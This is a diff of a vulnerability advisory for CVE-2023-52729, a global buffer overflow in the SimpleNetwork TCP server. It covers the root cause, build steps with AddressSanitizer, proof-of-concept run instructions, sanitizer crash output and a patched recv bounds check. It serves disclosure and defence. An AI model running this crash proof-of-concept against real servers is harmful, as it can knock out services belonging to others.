@@ -1,16 +1,36 @@
-## Compiling the project
+## CVE-2023-52729
+
+SimpleNetwork TCP Server commit 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496 suffers from a global buffer overflow when the TCPServer receives a single large packet containing ASCII characters. Using the following python3 script will invoke a global buffer overflow.
+
+### Root Cause 
+
+The msg buffer, defined as a global variable with a fixed size (MAXPACKETSIZE), is being overrun. The Python client sends a buffer (buf) of 50,000 bytes, which exceeds MAXPACKETSIZE. When attempting to null-terminate the received message (msg[n]=0), the code writes beyond the allocated buffer if n is equal to MAXPACKETSIZE, leading to a buffer overflow.
+
+### Specific Location
+
+The overflow occurs at TCPServer::Task(void*) in TCPServer.cpp line 39, where the received message attempts to be null-terminated without ensuring that n (the number of bytes received) is within the bounds of the msg array.
+
+```c
+msg[n]=0; 
+```
+
+#### Compiling the project with address sanitizer helps confirm this issue.  Here is the makefile for the example TCPServer:
 
 ```
-$ cd src
-$ make
-$ cd ../example-server
-$ make
+all: 
+        g++ -Wall -o server server.cpp -I../src/ ../src/TCPServer.cpp ../src/TCPClient.cpp -std=c++11 -lpthread -fsanitize=address
+
 ```
 
-## Global Buffer Overflow
+### Starting the TCP Server
 
+```
+$ ./server 1234
+```
 
-Server commit 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496 suffers from a global buffer overflow when the TCPServer receives a single large packet containing ASCII characters. Using the following python3 script will invoke a global buffer overflow:
+### Proof of Concept Python3 Script
+
+Save the proof of concept python3 script to a file named poc.py:
 
 ```
 import socket
@@ -30,41 +50,40 @@ except:
     print("Finished...")
 ```
 
-
-#### Compiling the project with address sanitizer helps confirm this issue.  Here is the makefile for the example TCPServer:
-
-```
-all: 
-        g++ -Wall -o server server.cpp -I../src/ ../src/TCPServer.cpp ../src/TCPClient.cpp -std=c++11 -lpthread -fsanitize=address
+Once the script has been saved, you can execute it with the following command:
 
 ```
+$ python3 poc.py
+```
 
-
-Address Sanitizer Output:
+### Address Sanitizer Output
 
 ```
+accept client[ id:0 ip:127.0.0.1 handle:4 ]
+Accepted
+open client[ id:0 ip:127.0.0.1 socket:4 send:0 ]
 =================================================================
-==15095==ERROR: AddressSanitizer: global-buffer-overflow on address 0xaaaae7e8f5c0 at pc 0xaaaae7e5b684 bp 0xffffa1efe720 sp 0xffffa1efe738
-WRITE of size 1 at 0xaaaae7e8f5c0 thread T2
-    #0 0xaaaae7e5b680 in TCPServer::Task(void*) (/home/kali/projects/SimpleNetwork/example-server/server+0xb680)
-    #1 0xffffa595edd4 in start_thread nptl/pthread_create.c:442
-    #2 0xffffa59c7e58 in thread_start ../sysdeps/unix/sysv/linux/aarch64/clone.S:79
+==840942==ERROR: AddressSanitizer: global-buffer-overflow on address 0x5633916a57e0 at pc 0x56339168917d bp 0x7f2bd78f4d00 sp 0x7f2bd78f4cf8
+WRITE of size 1 at 0x5633916a57e0 thread T2
+    #0 0x56339168917c in TCPServer::Task(void*) ../src/TCPServer.cpp:39
+    #1 0x7f2bdbaa63eb in start_thread nptl/pthread_create.c:444
+    #2 0x7f2bdbb26a1b in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81
 
-0xaaaae7e8f5c0 is located 0 bytes to the right of global variable 'msg' defined in '../src/TCPServer.cpp:3:6' (0xaaaae7e855c0) of size 40960
-0xaaaae7e8f5c0 is located 32 bytes to the left of global variable 'num_client' defined in '../src/TCPServer.cpp:4:5' (0xaaaae7e8f5e0) of size 4
-SUMMARY: AddressSanitizer: global-buffer-overflow (/home/kali/projects/SimpleNetwork/example-server/server+0xb680) in TCPServer::Task(void*)
+0x5633916a57e0 is located 0 bytes after global variable 'msg' defined in '../src/TCPServer.cpp:3:6' (0x56339169b7e0) of size 40960
+0x5633916a57e0 is located 32 bytes before global variable 'num_client' defined in '../src/TCPServer.cpp:4:5' (0x5633916a5800) of size 4
+SUMMARY: AddressSanitizer: global-buffer-overflow ../src/TCPServer.cpp:39 in TCPServer::Task(void*)
 Shadow bytes around the buggy address:
-  0x15655cfd1e60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x15655cfd1e70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x15655cfd1e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x15655cfd1e90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x15655cfd1ea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-=>0x15655cfd1eb0: 00 00 00 00 00 00 00 00[f9]f9 f9 f9 04 f9 f9 f9
-  0x15655cfd1ec0: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 01 f9 f9 f9
-  0x15655cfd1ed0: f9 f9 f9 f9 00 00 00 f9 f9 f9 f9 f9 00 00 00 f9
-  0x15655cfd1ee0: f9 f9 f9 f9 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9
-  0x15655cfd1ef0: 00 00 00 00 01 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
-  0x15655cfd1f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x5633916a5500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x5633916a5580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x5633916a5600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x5633916a5680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x5633916a5700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x5633916a5780: 00 00 00 00 00 00 00 00 00 00 00 00[f9]f9 f9 f9
+  0x5633916a5800: 04 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9
+  0x5633916a5880: 01 f9 f9 f9 f9 f9 f9 f9 00 00 00 f9 f9 f9 f9 f9
+  0x5633916a5900: 00 00 00 f9 f9 f9 f9 f9 00 00 00 00 00 f9 f9 f9
+  0x5633916a5980: f9 f9 f9 f9 00 00 00 00 01 f9 f9 f9 f9 f9 f9 f9
+  0x5633916a5a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 Shadow byte legend (one shadow byte represents 8 application bytes):
   Addressable:           00
   Partially addressable: 01 02 03 04 05 06 07 
@@ -85,14 +104,50 @@ Shadow byte legend (one shadow byte represents 8 application bytes):
   Left alloca redzone:     ca
   Right alloca redzone:    cb
 Thread T2 created by T0 here:
-    #0 0xffffa5dda234 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:207
-    #1 0xaaaae7e5c360 in TCPServer::accepted() (/home/kali/projects/SimpleNetwork/example-server/server+0xc360)
-    #2 0xaaaae7e566bc in main (/home/kali/projects/SimpleNetwork/example-server/server+0x66bc)
-    #3 0xffffa590777c in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
-    #4 0xffffa5907854 in __libc_start_main_impl ../csu/libc-start.c:381
-    #5 0xaaaae7e543ec in _start (/home/kali/projects/SimpleNetwork/example-server/server+0x43ec)
+    #0 0x7f2bdc047c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208
+    #1 0x563391689cf2 in TCPServer::accepted() ../src/TCPServer.cpp:101
+    #2 0x563391685646 in main /home/kali/projects/fuzzing/SimpleNetwork/example-server/server.cpp:94
+    #3 0x7f2bdba456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
 
-==15095==ABORTING
+==840942==ABORTING
+```
+
+### Mitigation
+
+To resolve this issue, ensure that the received message does not exceed the msg buffer size. This involves checking the size of the data received and handling cases where it exceeds MAXPACKETSIZE.
+
+* Limit the Received Data Size: Modify the recv call to ensure that the maximum number of bytes received does not exceed MAXPACKETSIZE - 1. This leaves room for the null terminator.
+
+* Add a Bounds Check: Before setting the null terminator, verify that n is less than MAXPACKETSIZE. If n equals MAXPACKETSIZE, you may need to handle the excess data properly or truncate the message, depending on the application's requirements.
+
+Below is a mitigation that can be applied to the code to prevent the global buffer overflow:
+
+```cpp
+void* TCPServer::Task(void *arg) {
+    int n;
+    struct descript_socket *desc = (struct descript_socket*) arg;
+    pthread_detach(pthread_self());
+
+    cerr << "open client[ id:"<< desc->id <<" ip:"<< desc->ip <<" socket:"<< desc->socket<<" send:"<< desc->enable_message_runtime <<" ]" << endl;
+    while(1) {
+        // Ensure we do not exceed the buffer size, leaving space for a null terminator
+        n = recv(desc->socket, msg, MAXPACKETSIZE - 1, 0);
+        if(n != -1) {
+            if(n == 0) {
+                // Handle client disconnection...
+            }
+            else {
+                // Ensure the message is null-terminated
+                msg[n] = 0;
+                desc->message = string(msg);
+                std::lock_guard<std::mutex> guard(mt);
+                Message.push_back(desc);
+            }
+        }
+        usleep(600);
+    }
+    // Cleanup and exit the thread...
+}
 
 ```
 
@@ -165,3 +220,5 @@ segmentation fault  ./server 80 1
 * https://cwe.mitre.org/data/definitions/415.html
 * https://github.com/kashimAstro/SimpleNetwork/issues/22
 * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36234
+* https://github.com/kashimAstro/SimpleNetwork/issues/23
+* https://cwe.mitre.org/data/definitions/121.html
